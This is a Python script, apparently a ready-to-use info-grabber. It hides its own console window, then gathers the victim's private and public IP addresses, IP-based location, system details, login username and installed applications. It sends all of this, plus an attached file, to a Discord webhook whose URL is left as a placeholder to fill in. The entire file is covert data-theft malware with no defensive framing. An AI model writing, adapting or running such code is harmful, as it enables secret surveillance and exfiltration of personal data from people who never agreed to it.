import os
import requests
import socket
import platform
import json
import psutil
from urllib.request import urlopen
import win32gui, win32con

def hide_console():
    hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hide , win32con.SW_HIDE)

def get_ipv4():
    ip_list = []
    try:
        # Get all IPv4 addresses
        hostname = socket.gethostname()
        ip_list.append(f"Private IP(s) for {hostname}:")
        for ip in socket.getaddrinfo(hostname, None):
            if ':' not in ip[4][0]:  # Exclude IPv6 addresses
                ip_list.append(ip[4][0])
        return ip_list
    except:
        return None

def get_public_ip():
    try:
        # Get the public IPv4 address
        response = urlopen('https://api.ipify.org/?format=json')
        data = json.load(response)
        public_ip = data['ip']
        return public_ip
    except:
        return None

def get_location(ip):
    try:
        # Get location information based on IP address
        response = urlopen(f'http://ip-api.com/json/{ip}')
        data = json.load(response)
        location = f"{data['city']}, {data['regionName']}, {data['country']}"
        return location
    except:
        return None

def get_system_info():
    system = platform.system()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    processor = platform.processor()

    # RAM and storage information
    ram = str(round(psutil.virtual_memory().total / (1024 ** 3), 2)) + " GB"
    storage = str(round(psutil.disk_usage('/').total / (1024 ** 3), 2)) + " GB"

    # Installed applications
    installed_apps = get_installed_apps()

    # Computer username
    username = os.getlogin()

    return f"**System Information:**\n**System:** {system}\n**Release:** {release}\n**Version:** {version}\n**Machine:** {machine}\n**Processor:** {processor}\n**RAM:** {ram}\n**Storage:** {storage}\n**Username:** {username}\n\n**Installed Applications:**\n" + "\n".join(installed_apps)

def send_to_discord(ip_list, public_ip, location, system_info):
    # Discord webhook URL
    webhook_url = 'Your URL'
    
    # Discord user ID
    user_id = os.getenv('USER_ID', 'Unknown')
    
    # Write installed applications to a file
    installed_apps = get_installed_apps()
    with open('apps.txt', 'w') as f:
        f.write("\n".join(installed_apps))
    
    # Formatted message to be sent
    message = f"**Private IP(s):**\n{'\n'.join(ip_list)}\n\n**Public IP:** `{public_ip}`\n**Location:** `{location}`\n\n**System Information:**\n{system_info}\n\nUser ID: {user_id}"
    
    # Add file link to the message
    message += "\n\nSee attached file for the list of installed applications."

    # Data to be sent to the webhook
    files = {'file': open('apps.txt', 'rb')}
    data = {'content': message}

    # Send POST request to the webhook URL
    requests.post(webhook_url, data=data, files=files)

def get_installed_apps():
    installed_apps = []
    if platform.system() == "Windows":
        for root, dirs, files in os.walk(r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs'):
            for file in files:
                installed_apps.append(file[:-4])
    elif platform.system() == "Linux":
        for root, dirs, files in os.walk('/usr/share/applications'):
            for file in files:
                if file.endswith('.desktop'):
                    with open(os.path.join(root, file), 'r') as f:
                        lines = f.readlines()
                        for line in lines:
                            if line.startswith('Name='):
                                installed_apps.append(line[5:].strip())
    elif platform.system() == "Darwin":
        for root, dirs, files in os.walk('/Applications'):
            for file in files:
                if file.endswith('.app'):
                    installed_apps.append(file[:-4])
    return installed_apps

def main():
    hide_console() # hide the console window
    # Get the private IPv4 addresses
    ip_list = get_ipv4()
    if ip_list:
        print("Private IPv4 address(es):")
        for ip in ip_list:
            print(ip)
    else:
        print("Failed to retrieve private IPv4 address.")

    # Get the public IPv4 address
    public_ip = get_public_ip()
    if public_ip:
        print(f"Your Public IPv4 address is: {public_ip}")
    else:
        print("Failed to retrieve public IPv4 address.")

    # Get the location based on public IP address
    location = get_location(public_ip)
    if location:
        print(f"Your location: {location}")
    else:
        print("Failed to retrieve location.")
    
    # Get system information
    system_info = get_system_info()
    print("System Information:")
    print(system_info)

    # Send the IP addresses, location, system information to Discord webhook
    send_to_discord(ip_list, public_ip, location, system_info)
    print("Data sent to Discord webhook.")

if __name__ == "__main__":
    main()
